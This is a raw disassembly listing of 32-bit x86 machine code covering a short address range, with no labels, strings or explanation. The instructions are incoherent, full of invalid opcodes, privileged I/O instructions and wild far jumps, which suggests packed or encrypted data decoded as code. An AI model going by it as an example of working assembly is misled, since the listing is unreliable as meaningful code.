  404882:	rcr    cl,cl
  404884:	add    dl,BYTE PTR [ecx]
  404886:	jecxz  0x404850
  404888:	enter  0xc0bc,0xc2
  40488c:	ficom  WORD PTR [edi+0x416ad7d2]
  404892:	inc    ecx
  404893:	imul   esi,DWORD PTR [esi+0x23],0xffffff85
  404897:	mov    ds:0x15e6321b,al
  40489c:	fs add al,ah
  40489f:	in     al,dx
  4048a0:	push   ebx
  4048a1:	add    ah,BYTE PTR [esi+0x2c]
  4048a4:	pop    edx
  4048a5:	dec    ecx
  4048a6:	mov    dl,0x33
  4048a8:	test   al,0x8
  4048aa:	push   esi
  4048ab:	pop    eax
  4048ac:	mov    ds:0x42ed273f,al
  4048b1:	stos   DWORD PTR es:[edi],eax
  4048b2:	(bad)  
  4048b3:	jecxz  0x4048f2
  4048b5:	sti    
  4048b6:	arpl   WORD PTR [edx],sp
  4048b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b9:	out    0x83,al
  4048bb:	xchg   DWORD PTR [ebp+0x7c],eax
  4048be:	mov    al,ds:0x13e6b4f3
  4048c3:	iret   
  4048c4:	pop    ss
  4048c5:	imul   ebp,esp,0x48e8d2aa
  4048cb:	shl    BYTE PTR [edi+0x68],cl
  4048ce:	mov    al,0x5b
  4048d0:	adc    eax,esi
  4048d2:	stc    
  4048d3:	js     0x40488c
  4048d5:	and    BYTE PTR [edi+0x2801b2c0],al
  4048db:	imul   esi,DWORD PTR [ebx],0x65caff8a
  4048e1:	(bad)
  4048e4:	and    esi,0xdf7aa09c
  4048ea:	aaa    
  4048eb:	popa   
  4048ec:	mov    bh,0xbd
  4048ee:	xlat   BYTE PTR ds:[ebx]
  4048ef:	dec    esi
  4048f0:	cs (bad) 
  4048f2:	fstp   DWORD PTR [ebp+0x5124377a]
  4048f8:	mov    ah,0x8a
  4048fa:	je     0x4048e2
  4048fc:	fst    QWORD PTR [ecx+0x20f74e47]
  404902:	and    eax,0x264f0061
  404907:	loope  0x40489a
  404909:	ret    
  40490a:	xor    eax,edi
  40490c:	push   eax
  40490d:	inc    esp
  40490e:	sti    
  40490f:	repz sbb DWORD PTR [esi+ebp*1-0xd],ebx
  404914:	pop    ds
  404915:	xor    esi,edi
  404917:	pop    ebx
  404918:	or     DWORD PTR [ebx-0x59],edi
  40491b:	ja     0x4048af
  40491d:	add    eax,0x7f9eafc6
  404922:	pop    esi
  404923:	rcl    BYTE PTR [edx+0x55],0xf4
  404927:	mov    ebx,0x73057e5e
  40492c:	outs   dx,BYTE PTR ds:[esi]
  40492d:	cld    
  40492e:	fild   QWORD PTR [esp+ebp*8-0x31]
  404932:	jle    0x40493e
  404934:	je     0x404975
  404936:	dec    ebp
  404937:	fisub  WORD PTR ds:0xce68673
  40493d:	cli    
  40493e:	lods   al,BYTE PTR ds:[esi]
  40493f:	mov    edx,0x64bdfb29
  404944:	repnz aad 0xf0
  404947:	gs dec ecx
  404949:	(bad)  
  40494a:	and    al,0x2d
  40494c:	ret    
  40494d:	push   ebx
  40494e:	loope  0x4049c8
  404950:	in     al,dx
  404951:	mov    ds:0x894d1aea,al
  404956:	jmp    0xc2f49776
  40495b:	push   ebp
  40495c:	sbb    eax,DWORD PTR [esi-0x3bd40b4a]
  404962:	sbb    eax,0x727a262a
  404967:	push   ebx
  404968:	xor    eax,0xd1e01324
  40496d:	pop    ebp
  40496e:	add    DWORD PTR [eax-0x7e],edi
  404971:	xchg   ecx,eax
  404972:	jne    0x40491d
  404974:	mov    ebp,0xc91b32af
  404979:	aad    0xcf
  40497b:	pushf  
  40497c:	mov    eax,0xbfa011f2
  404981:	mov    al,ds:0xda54c70b
  404986:	scas   al,BYTE PTR es:[edi]
  404987:	stos   BYTE PTR es:[edi],al
  404988:	fidivr DWORD PTR [ebp+0x1a]
  40498b:	sbb    al,0xe5
  40498d:	push   ecx
  40498e:	dec    esi
  40498f:	aas    
  404990:	jl     0x404970
  404992:	xchg   DWORD PTR [ebx+0x1e41bcb],eax
  404998:	cli    
  404999:	icebp  
  40499a:	gs push eax
  40499c:	jecxz  0x404974
  40499e:	sti    
  40499f:	repz cwde 
  4049a1:	sub    eax,0x9b9d30a8
  4049a6:	shr    DWORD PTR [edi-0x4a8cd5e3],1
  4049ac:	adc    DWORD PTR [edi],ebp
  4049ae:	mov    bl,BYTE PTR [eax+0x9]
  4049b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b3:	push   0x5e
  4049b5:	jp     0x4049b7
  4049b7:	pop    es
  4049b8:	sub    DWORD PTR [esi],ebp
  4049ba:	mov    cl,0x85
  4049bc:	daa    
  4049bd:	mov    al,ds:0xf1811d1b
  4049c2:	and    al,0x32
  4049c4:	push   cs
  4049c5:	push   eax
  4049c6:	inc    edx
  4049c7:	scas   eax,DWORD PTR es:[edi]
  4049c8:	jmp    0x4049f1
  4049ca:	(bad)  
  4049cc:	test   BYTE PTR [edx],0xa5
  4049cf:	and    eax,0x3250fe3b
  4049d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049d5:	sub    eax,0xdfdee193
  4049da:	jecxz  0x404a25
  4049dc:	mov    esp,0xb85848ea
  4049e1:	cli    
  4049e2:	fdiv   DWORD PTR [esi]
  4049e4:	loope  0x4049e1
  4049e6:	sub    bl,BYTE PTR [edi+0x17]
  4049e9:	cmp    BYTE PTR [esi+0x73299456],bl
  4049ef:	jle    0x404a2f
  4049f1:	aas    
  4049f2:	enter  0x71c7,0xaa
  4049f6:	aas    
  4049f7:	inc    esp
  4049f8:	mov    al,ds:0x736abc3d
  4049fd:	outs   dx,BYTE PTR ds:[esi]
  4049fe:	adc    DWORD PTR [eax+0x5902ecfd],esi
  404a04:	jb     0x40499f
  404a06:	cdq    
  404a07:	xchg   esi,eax
  404a08:	cs xor al,0x41
  404a0b:	push   es
  404a0c:	sub    DWORD PTR [ecx],edx
  404a0e:	es adc eax,0x7226bc33
  404a14:	xchg   esp,eax
  404a15:	dec    esi
  404a16:	inc    esp
  404a17:	xchg   edx,eax
  404a18:	pop    eax
  404a19:	mov    bh,BYTE PTR [ebx+ebp*2-0x5726f39a]
  404a20:	cmp    bh,0xf
  404a23:	out    0x64,eax
  404a25:	dec    eax
  404a26:	fwait
  404a27:	pop    ebx
  404a28:	rcr    BYTE PTR [edx+0x68],0xc0
  404a2c:	rcr    cl,0xc9
  404a2f:	mov    edi,DWORD PTR [eax+0x3d3cd671]
  404a35:	cld    
  404a36:	xchg   esi,eax
  404a37:	pop    eax
  404a38:	(bad)  
  404a39:	sbb    al,bh
  404a3b:	adc    ecx,ebx
  404a3d:	andps  xmm3,XMMWORD PTR [ebx]
  404a40:	addr16 sbb bh,ah
  404a43:	daa    
  404a44:	enter  0xf299,0x3
  404a48:	mov    ch,0x13
  404a4a:	sbb    ch,BYTE PTR [ebx-0x78]
  404a4d:	lea    esi,[ebx-0x7d2e1d07]
  404a53:	cmp    edi,DWORD PTR [ebx+0x6c]
  404a56:	xchg   esi,eax
  404a57:	inc    edi
  404a58:	mov    edi,0x39747e7f
  404a5d:	or     ah,BYTE PTR [ebp+ebp*4+0x49]
  404a61:	xor    edx,DWORD PTR [edi]
  404a63:	test   BYTE PTR [ecx+0x56],bl
  404a66:	leave  
  404a67:	sub    al,0x3f
  404a69:	add    esp,0x56
  404a6c:	sbb    BYTE PTR [ebp-0x3b],ch
  404a6f:	push   ebp
  404a70:	sahf   
  404a71:	inc    ebx
  404a72:	mov    ch,0x36
  404a74:	mov    dl,0x93
  404a76:	cwde   
  404a77:	or     DWORD PTR [ebx-0x30],0xf49e3ff0
  404a7e:	xor    eax,0xf7cbf8ea
  404a83:	sub    edi,edi
  404a85:	push   edi
  404a86:	popa   
  404a87:	add    bh,al
  404a89:	outs   dx,BYTE PTR ds:[esi]
  404a8a:	add    BYTE PTR [edx-0x77],al
  404a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a8e:	clc    
  404a8f:	mov    cl,0xc9
  404a91:	and    edx,DWORD PTR [esi+0x56]
  404a94:	loope  0x404b0a
  404a96:	rcr    BYTE PTR [edx+eiz*4+0x17337cf3],0xe3
  404a9e:	mov    esp,0xf73894dc
  404aa3:	jmp    0x404a89
  404aa5:	sbb    BYTE PTR [ebx+0x89a173a],ah
  404aab:	mov    BYTE PTR [ebx],ah
  404aad:	shr    DWORD PTR [ebp+ecx*8-0xe],0x86
  404ab2:	fld    TBYTE PTR [ebx]
  404ab4:	xor    ch,cl
  404ab6:	push   eax
  404ab7:	(bad)  
  404ab8:	mov    ecx,0x51c40a6e
  404abd:	dec    edx
  404abe:	jne    0x404a8e
  404ac0:	fist   DWORD PTR [ebx]
  404ac2:	inc    ebx
  404ac3:	imul   ebp,DWORD PTR [ecx],0x515bf854
  404ac9:	cld    
  404aca:	rcpps  xmm1,XMMWORD PTR [edx]
  404acd:	test   DWORD PTR [ecx+0x41090969],ebp
  404ad3:	int3   
  404ad4:	add    edi,DWORD PTR [esi]
  404ad6:	mov    dh,0x25
  404ad8:	jne    0x404b00
  404ada:	jp     0x404adf
  404adc:	mov    WORD PTR [edx+0x3d],cs
  404adf:	loop   0x404b5f
  404ae1:	clc    
  404ae2:	sbb    dh,BYTE PTR [ebx+0x76c1411]
  404ae8:	cmp    DWORD PTR [esi-0x5c424bec],esi
  404aee:	pop    edx
  404aef:	push   DWORD PTR [ebx]
  404af1:	xor    ebp,DWORD PTR [ebp-0xf59a8c7]
  404af7:	in     eax,dx
  404af8:	add    DWORD PTR [eax-0x2f1dc4d0],esp
  404afe:	dec    esi
  404aff:	or     esp,DWORD PTR [ebx-0x5279559a]
  404b05:	or     esi,DWORD PTR [edi+0x538012ec]
  404b0b:	mov    dh,0x21
  404b0d:	int    0x65
  404b0f:	lods   al,BYTE PTR ds:[esi]
  404b10:	xor    DWORD PTR [esi],edx
  404b12:	outs   dx,BYTE PTR ds:[esi]
  404b13:	dec    ebp
  404b14:	call   0x9fe4:0x483c5cab
  404b1b:	into   
  404b1c:	pushf  
  404b1d:	inc    edi
  404b1e:	xchg   ebp,eax
  404b1f:	imul   eax,DWORD PTR [eax-0x6c],0x4e
  404b23:	stos   BYTE PTR es:[edi],al
  404b24:	stos   DWORD PTR es:[edi],eax
  404b25:	mov    edi,0xe9d0d118
  404b2a:	mov    ebp,0x26993ee7
  404b2f:	shr    edi,cl
  404b31:	jp     0x404b1e
  404b33:	out    0x81,al
  404b35:	je     0x404abf
  404b37:	jmp    0x5fca:0x562db925
  404b3e:	fisubr WORD PTR ds:0x50015238
  404b44:	ja     0x404bc0
  404b46:	cwde   
  404b47:	and    bh,BYTE PTR [ebp-0x53de0fa9]
  404b4d:	ss pop es
  404b4f:	ror    DWORD PTR [ecx-0xf411898],1
  404b55:	mov    esp,0x45f50e0b
  404b5a:	jmp    0x1091:0xcefd7672
  404b61:	cmp    bl,ah
  404b63:	mov    dh,0x0
  404b65:	adc    dh,BYTE PTR [ebp+edi*1+0x2280def7]
  404b6c:	mov    esi,0xde5cc472
  404b71:	xchg   BYTE PTR [esi],ah
  404b73:	std    
  404b74:	mov    al,0x37
  404b76:	push   cs
  404b77:	gs push esp
  404b79:	add    ebx,DWORD PTR [edi]
  404b7b:	sub    BYTE PTR [eax+0x5e],ch
  404b7e:	mov    es,WORD PTR [edi]
  404b80:	cmp    eax,0x5659d544
  404b85:	sub    al,0x9a
  404b87:	sbb    edi,esi
  404b89:	(bad)  
  404b8a:	xchg   esp,eax
  404b8b:	adc    BYTE PTR [ecx],0xf0
  404b8e:	lock mov bl,BYTE PTR [ebx]
  404b91:	int3   
  404b92:	mov    al,BYTE PTR [esi]
  404b94:	into   
  404b95:	inc    edx
  404b96:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b98:	xchg   ebx,eax
  404b99:	rol    BYTE PTR [edi-0x75],cl
  404b9c:	push   esp
  404b9d:	mov    bl,BYTE PTR [ebx]
  404b9f:	inc    esi
  404ba0:	aam    0x74
  404ba2:	int3   
  404ba3:	xchg   esp,eax
  404ba4:	(bad)  
  404ba5:	retf   
  404ba6:	adc    ch,BYTE PTR [esi]
  404ba8:	or     bl,BYTE PTR [esi-0x6c]
  404bab:	test   DWORD PTR [ebx-0x57001a57],0x49dcf2d1
  404bb5:	iret   
  404bb6:	aaa    
  404bb7:	mov    WORD PTR [edx],ds
  404bb9:	loopne 0x404b6e
  404bbb:	out    dx,eax
  404bbc:	jb     0x404b76
  404bbe:	into   
  404bbf:	or     DWORD PTR [eax-0x7ea517a1],esp
  404bc5:	mov    ecx,0x8fd9dae3
  404bca:	mov    ecx,0x880259c0
  404bcf:	and    eax,0xabe185d2
  404bd4:	bound  esi,QWORD PTR [eax-0xe]
  404bd7:	cmp    BYTE PTR [ecx-0x58],0xa9
  404bdb:	add    ecx,DWORD PTR ss:[ebp+0x59]
  404bdf:	shr    BYTE PTR [edx+0x550e4537],0xcb
  404be6:	push   0xce680864
  404beb:	mov    ds:0xc339b1d6,eax
  404bf0:	mov    eax,0xb1b40d53
  404bf5:	lock mov edx,0x2dc4ce93
  404bfb:	inc    edi
  404bfc:	call   0x1627:0xea0d36aa
  404c03:	xor    ecx,0xffffffdd
  404c06:	xor    eax,0x6e3c07fd
  404c0b:	lock inc ecx
  404c0d:	mov    ecx,0x91491405
  404c12:	push   ebx
  404c13:	push   ecx
  404c14:	adc    ebp,edx
  404c16:	fldcw  WORD PTR [esp+ebx*8-0x72]
  404c1a:	test   DWORD PTR [ebx-0x4e],ebx
  404c1d:	xchg   BYTE PTR [edi+0x4430e5aa],ch
  404c23:	xchg   BYTE PTR ds:0xc19e0863,bh
  404c29:	mov    edx,0x1dec504b
  404c2e:	fnstenv [eax+0x39]
  404c31:	iret   
  404c32:	xor    eax,0x9485a33a
  404c37:	xchg   edx,eax
  404c38:	mov    al,ds:0x2de92d0
  404c3d:	pop    ss
  404c3e:	outs   dx,DWORD PTR ds:[esi]
  404c3f:	xchg   esp,eax
  404c40:	jae    0x404caf
  404c42:	test   al,0x60
  404c44:	mov    ds,WORD PTR [ebx]
  404c46:	rcr    DWORD PTR [ebx],0x0
  404c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c4a:	dec    eax
  404c4b:	mov    ch,0x3c
  404c4d:	mov    eax,ds:0xf662a391
  404c52:	fsub   DWORD PTR [edi]
  404c54:	shl    BYTE PTR [edx],1
  404c56:	sub    al,0xcc
  404c58:	jmp    0x3182:0xfffc3463
  404c5f:	clc    
  404c60:	jge    0x404c9f
  404c62:	out    dx,al
  404c63:	mov    cl,0x1
  404c65:	ins    BYTE PTR es:[edi],dx
  404c66:	jle    0x404c29
  404c68:	inc    ebx
  404c69:	cmc    
  404c6a:	enter  0xeaad,0xbd
  404c6e:	in     al,0x5f
  404c70:	mov    ch,0x58
  404c72:	pop    edi
  404c73:	cdq    
  404c74:	lods   eax,DWORD PTR ds:[esi]
  404c75:	add    edx,DWORD PTR [edi]
  404c77:	sbb    BYTE PTR [edi],dl
  404c79:	and    BYTE PTR [ebx-0x33],bl
  404c7c:	scas   al,BYTE PTR es:[edi]
  404c7d:	dec    ebp
  404c7e:	fsubr  QWORD PTR [esi]
  404c80:	sbb    ch,BYTE PTR [ecx]
  404c82:	inc    ebp
  404c83:	mov    WORD PTR [ecx-0x10903f9c],ss
  404c89:	mov    BYTE PTR [ebp-0x7859ed6],bh
  404c8f:	jns    0x404cb3
  404c91:	adc    al,0xeb
  404c93:	stos   DWORD PTR es:[edi],eax
  404c94:	sbb    dh,BYTE PTR [esi-0x26a9c223]
  404c9a:	int3   
  404c9b:	inc    edi
  404c9c:	std    
  404c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c9e:	mov    bl,0xc2
  404ca0:	mov    bh,0x4f
  404ca2:	data16 sahf 
  404ca4:	in     al,0xbc
  404ca6:	inc    ebx
  404ca7:	(bad)  
  404ca8:	push   eax
  404ca9:	cmp    al,0x35
  404cab:	add    esp,edx
  404cad:	sbb    bl,dl
  404caf:	dec    edi
  404cb0:	stc    
  404cb1:	in     eax,dx
  404cb2:	loope  0x404cdb
  404cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cb5:	pop    ss
  404cb6:	ss jo  0x404d22
  404cb9:	sbb    bh,bl
  404cbb:	push   esp
  404cbc:	jns    0x404c60
  404cbe:	cmp    BYTE PTR [ecx],al
  404cc0:	(bad)  
  404cc1:	rol    cl,0x26
  404cc4:	scas   al,BYTE PTR es:[edi]
  404cc5:	add    eax,0xfb4a1366
  404cca:	mov    ebp,0x6f52fa8a
  404ccf:	(bad)  
  404cd1:	daa    
  404cd2:	je     0x404c77
  404cd4:	sti    
  404cd5:	mov    esp,0xb899296e
  404cda:	xchg   ebp,eax
  404cdb:	mov    ch,0x56
  404cdd:	jge    0x404cb4
  404cdf:	cdq    
  404ce0:	jle    0x404cd9
  404ce2:	sti    
  404ce3:	cli    
  404ce4:	jns    0x404d56
  404ce6:	data16 aad 0xbb
  404ce9:	dec    edx
  404cea:	or     eax,0xec0daaaf
  404cef:	cwde   
  404cf0:	adc    al,0x26
  404cf2:	adc    dh,BYTE PTR [esi]
  404cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf5:	dec    esi
  404cf6:	and    al,0x2e
  404cf8:	fdivr  QWORD PTR [esi-0x1c9d8f68]
  404cfe:	(bad)  
  404cff:	lahf   
  404d00:	dec    ebx
  404d01:	push   es
  404d02:	xor    al,0x6c
  404d04:	mov    ebx,0xb8c9c9d9
  404d09:	rcl    cl,0x22
  404d0c:	push   ebx
  404d0d:	jno    0x404cc1
  404d0f:	xor    eax,0xea936f8e
  404d14:	jns    0x404d41
  404d16:	mov    eax,0xbddedf9e
  404d1b:	or     esp,DWORD PTR [eax-0x47c7a498]
  404d21:	retf   
  404d22:	jno    0x404ce6
  404d24:	push   ebx
  404d25:	xor    DWORD PTR ds:0xa27411ec,ebp
  404d2b:	mov    ebp,0xe394b597
  404d30:	pusha  
  404d31:	std    
  404d32:	jbe    0x404da0
  404d34:	hlt    
  404d35:	les    ecx,FWORD PTR [edi]
  404d37:	or     esi,eax
  404d39:	push   es
  404d3a:	pop    edi
  404d3b:	or     ch,BYTE PTR [ebx+0x771354bb]
  404d41:	leave  
  404d42:	jg     0x404cc6
  404d44:	imul   esp,DWORD PTR [ebx+0x8],0xffffffe3
  404d48:	(bad)  [ebx]
  404d4a:	inc    edx
  404d4b:	or     al,0x1d
  404d4d:	push   0x37
  404d4f:	cmp    DWORD PTR [ecx-0x1ee8f047],0x34
  404d56:	mov    dl,0x35
  404d58:	xor    eax,eax
  404d5a:	xor    DWORD PTR fs:[ebx+0x0],edx
  404d5e:	call   0xfe34b835
  404d63:	push   ss
  404d64:	loopne 0x404cea
  404d66:	adc    eax,0x1a9809a9
  404d6b:	ins    DWORD PTR es:[edi],dx
  404d6c:	(bad)  
  404d6d:	aad    0x92
  404d6f:	push   ss
  404d70:	jb     0x404d58
  404d72:	sbb    ch,ah
  404d74:	imul   edx,ecx,0x1ea6dec6
  404d7a:	bound  edi,QWORD PTR [edx]
  404d7c:	push   ds
  404d7d:	dec    edi
  404d7e:	popa   
  404d7f:	sbb    al,0x96
  404d81:	and    eax,0xa723e320
  404d86:	pop    esi
  404d87:	int    0x61
  404d89:	jl     0x404d18
  404d8b:	sbb    BYTE PTR [ebp-0x34f746e4],dh
  404d91:	xor    ebx,DWORD PTR [esi-0x597172fd]
  404d97:	add    BYTE PTR [ebx],dl
  404d99:	push   esi
  404d9a:	mov    ebp,0x2ef4e9f3
  404d9f:	aam    0x78
  404da1:	jb     0x404d73
  404da3:	call   0xa4a:0xe9011f3b
  404daa:	sahf   
  404dab:	pushf  
  404dac:	add    BYTE PTR [eax+0x1c9318d2],al
  404db2:	mov    edi,0x78eb6800
  404db7:	shl    DWORD PTR [ebp+0x47bb0db2],0x23
  404dbe:	cld    
  404dbf:	and    DWORD PTR [ebp-0x3b618def],edi
  404dc5:	mov    bl,0x91
  404dc7:	cld    
  404dc8:	ss pop esp
  404dca:	dec    esi
  404dcb:	fmul   DWORD PTR [ecx-0x171346cc]
  404dd1:	scas   eax,DWORD PTR es:[edi]
  404dd2:	or     eax,0x95c2bb41
  404dd7:	mov    ecx,0x9c3d5425
  404ddc:	test   BYTE PTR [esi-0x4502eb2d],bh
  404de2:	or     al,0x4c
  404de4:	adc    BYTE PTR [ebx],bh
  404de6:	leave  
  404de7:	test   eax,0x7130f423
  404dec:	cmp    al,0xb8
  404dee:	inc    ebx
  404def:	pusha  
  404df0:	add    DWORD PTR [eax+0x4cc59a92],ebx
  404df6:	gs sub ax,cx
  404dfa:	and    al,0x83
  404dfc:	mov    esi,0x75fc7416
  404e01:	jl     0x404e7d
  404e03:	jmp    0x7b11:0x1fa2c663
  404e0a:	loop   0x404e08
  404e0c:	ins    DWORD PTR es:[edi],dx
  404e0d:	cdq    
  404e0e:	pop    ss
  404e0f:	sub    esi,ecx
  404e11:	into   
  404e12:	or     al,BYTE PTR [ebp-0x6631dc38]
  404e18:	add    al,0x6c
  404e1a:	and    ebx,DWORD PTR [eax+0x2e18685f]
  404e20:	cmc    
  404e21:	retf   
  404e22:	pop    es
  404e23:	mov    DWORD PTR [eax],ebx
  404e25:	pop    ecx
  404e26:	sahf   
  404e27:	dec    eax
  404e28:	xor    DWORD PTR ds:0xc602f333,0x75c62ed8
  404e32:	retf   
  404e33:	pop    esp
  404e34:	sub    eax,0x39ad46b
  404e39:	fnstsw ax
  404e3b:	mov    WORD PTR [ecx-0x4],es
  404e3e:	dec    ebp
  404e3f:	mov    ecx,0xa4ff8d7a
  404e44:	retf   0xa34
  404e47:	mov    ch,0xc4
  404e49:	push   0x822a403b
  404e4e:	lea    ebx,[edx+0x3d111a6d]
  404e54:	test   eax,0xe1f9b08a
  404e59:	icebp  
  404e5a:	fstp   DWORD PTR [esi-0x60e47c02]
  404e60:	rcr    ch,0x28
  404e63:	jl     0x404df8
  404e65:	out    dx,al
  404e66:	push   edi
  404e67:	dec    edi
  404e68:	retf   
  404e69:	push   eax
  404e6a:	mov    bl,0xbb
  404e6c:	pop    eax
  404e6d:	arpl   WORD PTR ds:0x86e9688d,bx
  404e73:	scas   eax,DWORD PTR es:[edi]
  404e74:	outs   dx,DWORD PTR ds:[esi]
  404e75:	ror    BYTE PTR [edx-0x1687566f],cl
  404e7b:	xchg   DWORD PTR [ebx-0x3e],edi
  404e7e:	idiv   eax
  404e80:	fmul   st(0),st
  404e82:	popf   
  404e83:	adc    ebp,DWORD PTR [ebp-0x63c86f12]
  404e89:	add    al,0xb1
  404e8b:	das    
  404e8c:	sub    BYTE PTR [ebp-0x2a0ba754],0x44
  404e93:	cmp    BYTE PTR [esi+0x72],0xf7
  404e97:	in     eax,0xe9
  404e99:	mov    ebx,0x7b93be46
  404e9e:	call   0x992c:0x144d79b9
  404ea5:	push   ds
  404ea6:	push   es
  404ea7:	jg     0x404e49
  404ea9:	sbb    eax,0x57852c78
  404eae:	fsub   QWORD PTR [eax+0x79b62458]
  404eb4:	iret   
  404eb5:	cmp    eax,DWORD PTR [esi-0x6b537e03]
  404ebb:	repz loope 0x404edf
  404ebe:	inc    ecx
  404ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec0:	mov    ch,0x9c
  404ec2:	jb     0x404f07
  404ec4:	rcr    DWORD PTR [edx+0x17],1
  404ec7:	cmp    esi,DWORD PTR [ebx+0x2b]
  404eca:	test   BYTE PTR [esi],ch
  404ecc:	mov    esp,0xcf8cff2
  404ed1:	je     0x404e62
  404ed3:	mov    eax,ds:0x655f0b7b
  404ed8:	inc    ebp
  404ed9:	mov    ?,WORD PTR [edx-0x7d]
  404edc:	pusha  
  404edd:	scas   al,BYTE PTR es:[edi]
  404ede:	lods   al,BYTE PTR ds:[esi]
  404edf:	jge    0x404f54
  404ee1:	mov    edi,0xe5b60893
  404ee6:	xor    al,0x7f
  404ee8:	das    
  404ee9:	push   ecx
  404eea:	clc    
  404eeb:	sub    DWORD PTR [ebp+0x3d],edi
  404eee:	cmp    BYTE PTR gs:[ebp-0x6686a3b1],cl
  404ef5:	les    ebp,FWORD PTR [eax]
  404ef7:	fnstsw WORD PTR [eax+ebx*8]
  404efa:	push   0xffffffb1
  404efc:	repz mov bl,0x97
  404eff:	idiv   DWORD PTR [ebp+0x51]
  404f02:	dec    esp
  404f03:	jl     0x404eb3
  404f05:	std    
  404f06:	cli    
  404f07:	retf   0xc855
  404f0a:	sbb    ecx,DWORD PTR [edi+0x24]
  404f0d:	call   0x48b9:0x9292e744
  404f14:	jp     0x404f1b
  404f16:	out    0x6a,eax
  404f18:	jmp    0x404f0f
  404f1a:	shl    cl,cl
  404f1c:	in     al,dx
  404f1d:	aaa    
  404f1e:	mov    al,0x2d
  404f20:	mov    cl,0x4a
  404f22:	cs int3 
  404f24:	jne    0x404f04
  404f26:	mov    ebx,0x5fc86ec2
  404f2b:	add    BYTE PTR [ebx-0x4fcf0dc9],bl
  404f31:	icebp  
  404f32:	pop    esi
  404f33:	lahf   
  404f34:	out    0x44,al
  404f36:	adc    dl,BYTE PTR [ebx-0x3ebf173d]
  404f3c:	mov    al,0x4b
  404f3e:	fsubp  st(4),st
  404f40:	cmp    ebx,DWORD PTR [ecx-0x34]
  404f43:	popf   
  404f44:	and    eax,0xb28b6979
  404f49:	in     eax,dx
  404f4a:	mov    edi,0x12b9c0e2
  404f4f:	adc    al,0xa4
  404f51:	mov    esi,0x776e4ae0
  404f56:	mov    eax,0x588b27ba
  404f5b:	clc    
  404f5c:	das    
  404f5d:	out    0x72,eax
  404f5f:	(bad)  
  404f60:	shl    dh,1
  404f62:	cmp    edx,DWORD PTR [edi+eax*4-0x22]
  404f66:	mov    ch,0x6f
  404f68:	popf   
  404f69:	(bad)  
  404f6a:	fcmovne st,st(3)
  404f6c:	inc    edi
  404f6d:	and    ebx,ebp
  404f6f:	add    ebx,esi
  404f71:	sbb    DWORD PTR [eax+0x51],esi
  404f74:	es loop 0x404fea
  404f77:	or     DWORD PTR [edi+0x1c],ecx
  404f7a:	sub    DWORD PTR [ebx],ebp
  404f7c:	pop    ds
  404f7d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  404f7f:	jbe    0x404fa7
  404f81:	ins    DWORD PTR es:[edi],dx
  404f82:	cmp    DWORD PTR [ecx+0xd6135f2],0xce92af7e
  404f8c:	xchg   DWORD PTR [eax-0x5a302f98],ecx
  404f92:	lds    ecx,FWORD PTR [edi-0x51fa3e11]
  404f98:	js     0x405005
  404f9a:	gs dec ebx
  404f9c:	cmp    al,0x43
  404f9e:	add    DWORD PTR [ecx+0x6763869a],0x28
  404fa5:	cwde   
  404fa6:	mov    edi,0xf5e5af4f
  404fab:	adc    DWORD PTR [ebp+0x24320e86],ebp
  404fb1:	sbb    dl,BYTE PTR [ebx+0x59]
  404fb4:	les    ecx,FWORD PTR [edx]
  404fb6:	xor    al,0x1a
  404fb8:	mov    esi,0x1e1cf5e8
  404fbd:	lahf   
  404fbe:	mov    eax,0xfe5a8d96
  404fc3:	aad    0xb8
  404fc5:	mov    eax,ds:0x3b6472c6
  404fca:	jge    0x404f81
  404fcc:	aas    
  404fcd:	ficom  DWORD PTR [ebx-0x10]
  404fd0:	jp     0x404fbe
  404fd2:	jmp    DWORD PTR [edi]
  404fd4:	and    ebp,DWORD PTR [ecx+eiz*1-0x35]
  404fd8:	cli    
  404fd9:	outs   dx,DWORD PTR ds:[esi]
  404fda:	mov    ch,0xf9
  404fdc:	or     DWORD PTR [eax-0x67092017],edx
  404fe2:	js     0x40503a
  404fe4:	inc    eax
  404fe5:	inc    edi
  404fe6:	int3   
  404fe7:	loopne 0x404fa7
  404fe9:	call   0x4f6a:0x63907e8b
  404ff0:	and    bl,BYTE PTR [ecx+0x2df0953a]
  404ff6:	push   ecx
  404ff7:	jle    0x404f94
  404ff9:	mov    dl,0xb7
  404ffb:	push   es
  404ffc:	and    DWORD PTR [ecx-0xeb44e52],ecx
  405002:	mov    DWORD PTR [ecx-0x3106a6f9],0x6911173a
  40500c:	and    DWORD PTR [ecx-0x71],edi
  40500f:	or     edi,DWORD PTR [edi]
  405011:	push   eax
  405012:	jp     0x405036
  405014:	sbb    al,0xb6
  405016:	jmp    0x8222:0x53a1d7c5
  40501d:	push   ebx
  40501e:	mov    dh,0xfd
  405020:	sti    
  405021:	add    dl,dh
  405023:	xchg   edi,eax
  405024:	mov    ebx,0xe36bbb5e
  405029:	stc    
  40502a:	xor    BYTE PTR [ecx-0x23bb4ae],al
  405030:	rcr    BYTE PTR [esi+0xe34fdb3],0xc5
  405037:	adc    eax,0xdf1009d9
  40503c:	cmp    DWORD PTR [ecx],ecx
  40503e:	or     BYTE PTR [esi],bh
  405040:	retf   
  405041:	fdivr  DWORD PTR [esp+ebp*1]
  405044:	push   edi
  405045:	mov    ecx,0x825a88e
  40504a:	push   ecx
  40504b:	cdq    
  40504c:	mov    al,0xac
  40504e:	popf   
  40504f:	add    cl,ch
  405051:	scas   al,BYTE PTR es:[edi]
  405052:	xlat   BYTE PTR ds:[ebx]
  405053:	arpl   WORD PTR [esi+0x43b90669],bp
  405059:	lock fdiv QWORD PTR [esp+ebx*1-0x7b]
  40505e:	xchg   esp,eax
  40505f:	sub    eax,0xf309eea4
  405064:	dec    ebp
  405065:	push   ecx
  405066:	mov    ch,0x4b
  405068:	sbb    BYTE PTR [ebx-0x2a],ah
  40506b:	call   0x12a1e3b6
  405070:	mov    bl,BYTE PTR [edx]
  405072:	adc    ah,BYTE PTR [ebx-0x27]
